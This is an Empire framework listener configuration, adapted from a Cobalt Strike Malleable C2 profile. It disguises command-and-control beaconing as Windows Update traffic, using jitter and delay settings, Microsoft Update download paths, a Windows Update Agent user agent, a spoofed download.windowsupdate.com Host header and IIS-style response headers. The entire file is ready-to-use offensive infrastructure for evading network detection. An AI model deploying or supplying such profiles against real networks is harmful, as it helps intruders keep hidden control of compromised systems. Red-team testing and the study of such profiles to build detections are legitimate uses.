# Microsoft Update
#
# https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile
# 
# Author: Rahmat Nurfauzi - @infosecn1nja

listeners
uselistener http
set Name microsoftupdate
set DefaultJitter 20
set DefaultDelay 6
set DefaultProfile /c/msdownload/update/others/2013/11/9946821_f5082b842c8abc5c47cfc68f98340ec384b69fa9.cab,/c/msdownload/update/software/ftpk/2013/11/ie-spelling-nl_3576e6450352dfc0c0892bf62384e75a56d780a7.msu|Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40|Host:download.windowsupdate.com|Accept:*/*
set Headers Content-Type:application/vnd.ms-cab-compressed|Server:Microsoft-IIS/8.5|MSRegion:N. America|Connection:keep-alive|X-Powered-By:ASP.NET
